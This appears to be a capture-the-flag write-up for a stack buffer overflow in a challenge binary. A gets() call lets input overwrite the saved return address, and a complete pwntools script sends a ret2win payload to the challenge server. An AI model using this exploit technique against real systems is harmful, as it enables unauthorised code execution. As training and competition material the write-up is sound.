## 19jt lapangan padel
---

>## Initial Analysis

We're given a 64-bit ELF binary named `chall`:

```
chall: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

The binary contains a vulnerable input function and an unused `win()` function. The goal is to overwrite the saved return address and redirect execution to `win()`.

### Protections

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

With PIE disabled, the binary uses fixed addresses. The `win()` function is at `0x401236` in this binary.

```asm
; vuln(): 64-byte stack buffer and unbounded input
0x4012cd <+8>:   sub    rsp, 0x40
0x401312 <+77>:  lea    rax, [rbp-0x40]
0x40131e <+89>:  call   gets@plt
0x40134e <+137>: leave
0x40134f <+138>: ret

; win(): open flag.txt, read it, and print it
0x401256 <+32>:  call   fopen@plt
0x40128f <+89>:  call   fgets@plt
0x4012aa <+116>: call   printf@plt
```

>## Solution

The vulnerable buffer is 64 bytes long. The saved RBP takes another 8 bytes, so the saved RIP is 72 bytes from the start of the input. The solver adds a single `ret`gadget before `win()` to keep the stack aligned when entering the function.

```text
offset to saved RIP = 64 + 8 = 72 bytes
```

The payload is therefore:

```python
payload = b"A" * 72 + p64(ret_gadget) + p64(win)
```

>### Exploit

```python
from pwn import *

elf = ELF("./chall")
p = remote("chall-ctf.ara-its.id", 4040)

ret = 0x40101a
win = elf.symbols["win"]

payload = b"A" * 72 + p64(ret) + p64(win)

p.sendlineafter(b"Enter your name: ", payload)
p.interactive()
```

The challenge ended some time ago, and I only got around to writing this writeup now. The server no longer returns the flag.

>### Flag

```
ARA{th3_ch4ll3ng3_1s_3nded}
```
